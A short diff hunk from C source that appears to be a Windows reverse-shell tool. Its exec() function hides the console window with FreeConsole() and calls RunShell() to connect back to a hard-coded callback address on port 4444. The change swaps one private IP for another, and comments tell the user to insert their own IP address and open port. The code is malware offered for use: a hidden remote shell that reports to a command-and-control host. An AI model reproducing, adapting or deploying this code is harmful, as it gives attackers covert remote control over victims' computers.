@@ -62,7 +62,7 @@ void RunShell(char* C2Server, int C2Port) {
 
 void exec(void) {
     FreeConsole(); //no close window
-    char host[] = "192.168.96.134";  // change this to your ip address
+    char host[] = "192.168.100.129";  // change this to your ip address
     int port = 4444;                //change this to your open port
     RunShell(host, port);
 }
